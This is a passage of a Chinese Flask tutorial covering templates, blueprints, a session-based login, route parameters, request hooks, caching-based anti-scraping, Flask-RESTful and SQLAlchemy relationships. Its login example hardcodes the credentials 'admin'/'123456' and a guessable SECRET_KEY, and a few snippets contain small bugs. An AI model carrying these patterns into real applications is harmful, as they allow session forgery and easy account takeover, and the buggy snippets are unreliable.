+<h2 id="2、简单的模板渲染"><a href="#2、简单的模板渲染" class="headerlink" title="2、简单的模板渲染"></a>2、简单的模板渲染</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">render_template()  <span class="comment">#可以返回一个渲染的html页面</span></span><br></pre></td></tr></table></figure>
+
+<p>示例：</p>
+<p>app.py</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, name=<span class="string">&quot;法外狂徒张三&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>index.html</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;../static/index.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>index<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span>&gt;</span>name: &#123;&#123; name &#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以利用render_template去将后端的一些数据返回到前端，然后再使用去使用传递过来的参数</p>
+<h2 id="3、对文件结构进行进行拆分"><a href="#3、对文件结构进行进行拆分" class="headerlink" title="3、对文件结构进行进行拆分"></a>3、对文件结构进行进行拆分</h2><p>文件结构：</p>
+<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-19/137d93a1d65364fb1dee979682c5fa2a--6af8--image-20231119182749925.png" alt="image-20231119182749925"></p>
+<p>将除了主文件的其他文件都移入一个单独创建的App文件夹当中。</p>
+<blockquote>
+<p>init.py：初始化的文件，在这里我们将app的创建函数放入其中，待需要使用时导入即可</p>
+<p>models.py：模板文件，后边主要用于数据库方面的操作</p>
+<p>views.py：视图函数的存放，也就是存放各种路由的地方</p>
+</blockquote>
+<p>为了方便视图函数的使用，使用蓝图去绑定</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">app.register_blueprint(blueprint=blue)</span><br></pre></td></tr></table></figure>
+
+<p>将app绑定在blue上，这样之后路由就可以这样去使用了</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/home/&#x27;</span></span>)</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="4、简易登录界面的实现"><a href="#4、简易登录界面的实现" class="headerlink" title="4、简易登录界面的实现"></a>4、简易登录界面的实现</h2><h3 id="①cookie的一些设置"><a href="#①cookie的一些设置" class="headerlink" title="①cookie的一些设置"></a>①cookie的一些设置</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">response = redirect(<span class="string">&#x27;/home/&#x27;</span>) <span class="comment">#重定向，用于登录后界面的跳转</span></span><br><span class="line"></span><br><span class="line">response.set_cookie(<span class="string">&#x27;user&#x27;</span>, username, max_age=<span class="number">3600</span>*<span class="number">24</span>*<span class="number">7</span>)</span><br></pre></td></tr></table></figure>
+
+<p>可以直接通过set__cookie去设置一个json格式的cookie</p>
+<h3 id="②session的一些设置"><a href="#②session的一些设置" class="headerlink" title="②session的一些设置"></a>②session的一些设置</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>将app的配置文件中的SECRET_KEY修改为不空的值，并且将这个作为密匙去加密</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">session[<span class="string">&#x27;user&#x27;</span>] = username</span><br><span class="line"></span><br><span class="line">session.permanent = <span class="literal">True</span>  <span class="comment">#默认是false，关闭浏览器后就清空session</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="③实现"><a href="#③实现" class="headerlink" title="③实现"></a>③实现</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Blueprint, redirect, render_template, request, session</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">blue = Blueprint(<span class="string">&#x27;user&#x27;</span>, __name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/home/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    username = session.get(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;home.html&#x27;</span>, username</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)   <span class="comment">#获取传递过来的参数</span></span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password == <span class="string">&#x27;123456&#x27;</span>:</span><br><span class="line">            response = redirect(<span class="string">&#x27;/home/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># response.set_cookie(&#x27;user&#x27;, username, max_age=3600*24*7)</span></span><br><span class="line">            session[<span class="string">&#x27;user&#x27;</span>] = username</span><br><span class="line">            session.permanent = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;用户名或密码错误！&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/logout/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    response = redirect(<span class="string">&#x27;/home/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    session.pop(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="comment"># @blue.route(&#x27;/string/&lt;string:name&gt;/&#x27;, methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span></span><br><span class="line"><span class="comment"># def get_string(name):</span></span><br><span class="line"><span class="comment">#     print(type(name))</span></span><br><span class="line"><span class="comment">#     return name</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @blue.route(&#x27;/redirect/&#x27;)</span></span><br><span class="line"><span class="comment"># def make_redirect():</span></span><br><span class="line"><span class="comment">#     pass</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     return redirect(&#x27;https://www.qq.com&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<p>在自己设计一个前段登入即可</p>
+<p>示例：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="5、路由参数"><a href="#5、路由参数" class="headerlink" title="5、路由参数"></a>5、路由参数</h2><blockquote>
+<p>string  接收如何没有斜杠(‘&#x2F;‘)的字符串(默认)</p>
+<p>int  接收整型</p>
+<p>float   接收浮点型</p>
+<p>path  接收路径，可接收斜线(‘&#x2F;‘)</p>
+<p>uuid   只接受uuid字符串，唯一码，一种生成规律（uuid是一段特定的字符串，基本无法伪造）</p>
+<p>any   可以同时指定多种路径，进行限定</p>
+</blockquote>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/any/&lt;any(apple, orange, banana):fruit&gt;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_any</span>(<span class="params">fruit</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(fruit))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(fruit)</span><br></pre></td></tr></table></figure>
+
+<p>any表示限定只能在给定的之中选择</p>
+<h2 id="6、路由请求方法的指定"><a href="#6、路由请求方法的指定" class="headerlink" title="6、路由请求方法的指定"></a>6、路由请求方法的指定</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/login/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br></pre></td></tr></table></figure>
+
+<p>设置该路由可以由GET和POST这两种请求方法区访问</p>
+<p>一些最常见的请求方式</p>
+<blockquote>
+<p>GET</p>
+<p>POST</p>
+<p>PUT</p>
+<p>DELETE</p>
+</blockquote>
+<h1 id="四、flask中四个全局变量"><a href="#四、flask中四个全局变量" class="headerlink" title="四、flask中四个全局变量"></a>四、flask中四个全局变量</h1><p>**</p>
+<table>
+<thead>
+<tr>
+<th><strong>变量</strong></th>
+<th><strong>上下文</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>current_app</td>
+<td>应用上下文</td>
+<td>相当与在主程序中激活的实例化app（<code>app=Flask(__name__)</code>）</td>
+</tr>
+<tr>
+<td>g</td>
+<td>应用上下文</td>
+<td>一次性函数，处理请求的临时变量。只在一个请求中被应用，下个请求开始时会自动重置</td>
+</tr>
+<tr>
+<td>request</td>
+<td>请求上下文</td>
+<td>请求对象。存放了客户端发来的HTTP信息</td>
+</tr>
+<tr>
+<td>session</td>
+<td>请求上下文</td>
+<td>记录用户和服务器之间的会话的。在服务器端记录需要记住的信息。（和cookie对应，cookies是记录在客户端的）</td>
+</tr>
+</tbody></table>
+<p><strong>request中的一些用法:</strong></p>
+<blockquote>
+<p>url   完整请求地址</p>
+<p>base_url   去掉GET参数的URL</p>
+<p>host_url   只有主机和端口号的URL</p>
+<p>path  路由中的路径</p>
+<p>method 请求方式</p>
+<p>remote_addr  请求的客户端地址</p>
+<p>args   GET请求参数</p>
+<p>form   POST请求参数</p>
+<p>files   文件上传</p>
+<p>headers  请求头</p>
+<p>cookies   请求头中的cookie</p>
+</blockquote>
+<h1 id="五、钩子函数装饰器"><a href="#五、钩子函数装饰器" class="headerlink" title="五、钩子函数装饰器"></a>五、钩子函数装饰器</h1><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>before_first_request</td>
+<td>处理第一次请求之前</td>
+</tr>
+<tr>
+<td>before_request</td>
+<td>在每次请求之前，通常利用这个处理一些变量，实现反爬</td>
+</tr>
+<tr>
+<td>app.after_request</td>
+<td>注册一个函数，如果没有未处理的异常抛出，每次请求结束后运行</td>
+</tr>
+<tr>
+<td>app.teardown_request</td>
+<td>有异常也会运行，每次请求结束后。当APP上下文被移除后执行的函数，可以进行数据库的提交和回滚</td>
+</tr>
+</tbody></table>
+<p>使用示例：</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blue.before_request  </span><span class="comment">#每次请求之前访问</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">before</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;before request&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h1 id="六、Flask的一些插件的使用"><a href="#六、Flask的一些插件的使用" class="headerlink" title="六、Flask的一些插件的使用"></a>六、Flask的一些插件的使用</h1><h2 id="1、flask-caching"><a href="#1、flask-caching" class="headerlink" title="1、flask-caching"></a>1、flask-caching</h2><p>安装</p>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">pip install flask-caching</span><br></pre></td></tr></table></figure>
+
+<p>初始化</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">cache = Cache(config=&#123;</span><br><span class="line">    <span class="string">&#x27;CACHE_TYPE&#x27;</span>: <span class="string">&#x27;simple&#x27;</span>  <span class="comment">#缓存类型</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>添加缓存</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@cache.cached(<span class="params">timeout=<span class="number">20</span></span>)   </span><span class="comment">#使缓存存在20秒</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;index2&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(g.star)</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;index2&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>对反爬的相关应用</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@blue.before_request  </span><span class="comment">#每次请求之前访问</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">before</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;before request&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(request.path)</span><br><span class="line">    <span class="built_in">print</span>(request.method)</span><br><span class="line">    <span class="built_in">print</span>(request.remote_addr)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#简单的反爬</span></span><br><span class="line">    <span class="built_in">print</span>(request.user_agent)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;python&#x27;</span> <span class="keyword">in</span> request.user_agent.string:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;您正在使用python爬虫，再见！&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#针对ip作反爬</span></span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> cache.get(ip):</span><br><span class="line">        <span class="comment">#做了个拦截，不会进入视图函数</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;小伙子，别爬了！&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#对每个ip设置一个缓存，1秒内不让重复访问</span></span><br><span class="line">        cache.<span class="built_in">set</span>(ip, <span class="string">&#x27;value&#x27;</span>, timeout=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<h1 id="七、前后端分离模式"><a href="#七、前后端分离模式" class="headerlink" title="七、前后端分离模式"></a>七、前后端分离模式</h1><p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-19/7a211a47e9bdbf3195d69d8b36829d3b--ad35--image-20231119204503992.png" alt="image-20231119204503992"></p>
+<p>将原本的views拆分为urls和apis。</p>
+<p>urls.py</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  路由文件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> .exts <span class="keyword">import</span> api</span><br><span class="line"><span class="keyword">from</span> .apis <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">api.add_resource(HelloResource, <span class="string">&#x27;/hello/&#x27;</span>)</span><br><span class="line">api.add_resource(UserResource, <span class="string">&#x27;/user/&#x27;</span>, endpoint=<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">api.add_resource(User2Resource, <span class="string">&#x27;/user2/&#x27;</span>)</span><br><span class="line">api.add_resource(User4Resource, <span class="string">&#x27;/user4/&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>apis.py</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> jsonify</span><br><span class="line"><span class="keyword">from</span> flask_restful <span class="keyword">import</span> Resource, fields, marshal_with, reqparse</span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 类视图  CBV</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HelloResource</span>(<span class="title class_ inherited__">Resource</span>):   <span class="comment">#必须要继承Resource</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;get请求&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">post</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;methods&#x27;</span>: <span class="string">&#x27;post请求&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Flask-RESTful</span></span><br><span class="line">ret_field = &#123;</span><br><span class="line">    <span class="string">&#x27;status&#x27;</span>: fields.Integer,</span><br><span class="line">    <span class="string">&#x27;msg&#x27;</span>: fields.String,</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: fields.String,</span><br><span class="line">    <span class="string">&#x27;like&#x27;</span>: fields.String(default=<span class="string">&#x27;ball&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;data2&#x27;</span>: fields.String(attribute=<span class="string">&#x27;data&#x27;</span>) <span class="comment">#类似于引用，将data的值给一个另外名字的变量</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserResource</span>(<span class="title class_ inherited__">Resource</span>):</span><br><span class="line"><span class="meta">    @marshal_with(<span class="params">ret_field</span>)     </span><span class="comment">#flask的一个拓展，用以规范后端返回数据的格式</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span>: <span class="string">&#x27;千峰教育Python&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user_fields = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: fields.Integer,</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: fields.String,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span>: fields.Integer,</span><br><span class="line">    <span class="string">&#x27;url&#x27;</span>: fields.Url(endpoint=<span class="string">&#x27;id&#x27;</span>, absolute=<span class="literal">True</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret_field2 = &#123;</span><br><span class="line">    <span class="string">&#x27;status&#x27;</span>: fields.Integer,</span><br><span class="line">    <span class="string">&#x27;msg&#x27;</span>: fields.String,</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: fields.Nested(user_fields)  <span class="comment">#获取一个列表数据</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User2Resource</span>(<span class="title class_ inherited__">Resource</span>):</span><br><span class="line"><span class="meta">    @marshal_with(<span class="params">ret_field2</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        user = User.query.first()   <span class="comment">#从数据库中拿出数据</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="string">&#x27;msg&#x27;</span>: <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span>: user</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数解析  完成前端数据的返回</span></span><br><span class="line">parser = reqparse.RequestParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;name&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;name是必须的&#x27;</span>)   </span><br><span class="line">parser.add_argument(<span class="string">&#x27;age&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, action=<span class="string">&#x27;append&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User4Resource</span>(<span class="title class_ inherited__">Resource</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">self</span>):</span><br><span class="line">        args = parser.parse_args()</span><br><span class="line">        name = args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">        age = args.get(<span class="string">&#x27;age&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&#x27;name&#x27;</span>: name, <span class="string">&#x27;age&#x27;</span>: age&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="八、数据表之间的操作"><a href="#八、数据表之间的操作" class="headerlink" title="八、数据表之间的操作"></a>八、数据表之间的操作</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> .exts <span class="keyword">import</span> db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#一对多</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Grade</span>(db.Model):</span><br><span class="line">    __tablename__ = <span class="string">&#x27;grade&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">30</span>), unique=<span class="literal">True</span>, index=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment">#建立关联</span></span><br><span class="line">    <span class="comment">#定义班级表的一对多关系，不是字段，Student为学生表模型，backref为反向查找名称</span></span><br><span class="line">    students = db.relationship(<span class="string">&#x27;Student&#x27;</span>, backref=<span class="string">&#x27;grade&#x27;</span>, lazy=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>(db.Model):</span><br><span class="line">    __tablename__ = <span class="string">&#x27;student&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">30</span>), unique=<span class="literal">True</span>)</span><br><span class="line">    age = db.Column(db.Integer)</span><br><span class="line">    <span class="comment">#创建外键，关联到班级表的主键，实现一对多关系，班级表中也要有对应操作</span></span><br><span class="line">    gradeid = db.Column(db.Integer, db.ForeignKey(Grade.<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#多对多    </span></span><br><span class="line"><span class="comment">#中间表（不是类）    </span></span><br><span class="line">collect = db.Table(</span><br><span class="line">    <span class="string">&#x27;collects&#x27;</span>,</span><br><span class="line">    <span class="comment">#user_id为表字段名称，user.id未外键表的id</span></span><br><span class="line">    db.Column(<span class="string">&#x27;user_id&#x27;</span>, db.Integer, db.ForeignKey(<span class="string">&#x27;usermodel.id&#x27;</span>), primary_key=<span class="literal">True</span>),</span><br><span class="line">    db.Column(<span class="string">&#x27;movie_id&#x27;</span>, db.Integer, db.ForeignKey(<span class="string">&#x27;movie.id&#x27;</span>), primary_key=<span class="literal">True</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserModel</span>(db.Model):</span><br><span class="line">    __tablename__ = <span class="string">&#x27;usermodel&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">30</span>))</span><br><span class="line">    age = db.Column(db.Integer)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Movie</span>(db.Model):</span><br><span class="line">    __tablename__ = <span class="string">&#x27;movie&#x27;</span></span><br><span class="line">    <span class="built_in">id</span> = db.Column(db.Integer, primary_key=<span class="literal">True</span>, autoincrement=<span class="literal">True</span>)</span><br><span class="line">    name = db.Column(db.String(<span class="number">30</span>))</span><br><span class="line">    age = db.Column(db.Integer)</span><br><span class="line">	</span><br><span class="line">    <span class="comment">#多对多  关联的学生摆个的模型   中间表的名称   反向查找</span></span><br><span class="line">    users = db.relationship(<span class="string">&#x27;UserModel&#x27;</span>, backref=<span class="string">&#x27;movies&#x27;</span>, lazy=<span class="string">&#x27;dynamic&#x27;</span>, secondary=collect)</span><br></pre></td></tr></table></figure>
+
+<p>lazy属性</p>
+<blockquote>
